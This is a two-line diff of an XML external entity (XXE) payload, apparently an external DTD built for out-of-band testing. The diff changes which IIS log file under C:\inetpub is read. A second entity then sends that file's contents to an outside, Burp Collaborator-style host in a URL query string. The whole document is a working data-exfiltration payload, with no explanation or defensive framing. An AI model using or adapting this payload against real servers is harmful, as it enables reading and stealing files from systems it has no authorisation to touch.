@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "file:///C:\inetpub\logs\LogFiles\W3SVC1_20241021.log">
+<!ENTITY % data SYSTEM "file:///C:\inetpub/logs/LogFiles/W3SVC1/u_ex241022.log">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
